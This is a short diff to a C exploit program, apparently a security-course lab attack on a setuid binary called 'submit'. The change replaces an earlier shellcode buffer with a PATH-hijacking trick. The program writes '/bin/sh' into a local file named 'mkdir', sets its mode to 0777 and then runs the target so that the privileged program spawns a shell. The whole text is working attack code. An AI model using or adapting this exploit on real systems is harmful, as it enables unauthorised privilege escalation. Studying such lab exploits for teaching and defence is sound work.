@@ -7,7 +7,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
-#include "shellcode.h"
+#include <sys/stat.h>
 
 #define TARGET "/usr/local/bin/submit" // or submitV2
 
@@ -15,27 +15,16 @@ int main() {
     FILE *fp;
 	char *args[4];
 	char *env[1];
-    unsigned char argbuf[4017]; 
+    const char key[] = "/bin/sh";
 
-    char *ptr;
-
-    strcpy(argbuf, "/bin/sh");
-
-    // create the argbuf
-    //memset(argbuf, '.', sizeof(unsigned char)*4016);
-
-    //ptr = argbuf;
-    //memcpy(ptr, shellcode, strlen(shellcode));
-
-   // fp = fopen("/usr/bin/find", "w+");
-    //fprintf(fp, "%s", argbuf);
-    fp = fopen("find", "w+");
-	fprintf(fp, "/bin/sh");
+    fp = fopen("mkdir", "w+");
+    fprintf(fp, key);
 	fclose(fp);
-
+    chmod("mkdir", 0777);
+    
 
 	args[0] = TARGET;
-	args[1] = "-s"; 
+	args[1] = "file.txt"; 
     args[2] = NULL;
     args[3] = NULL;
 
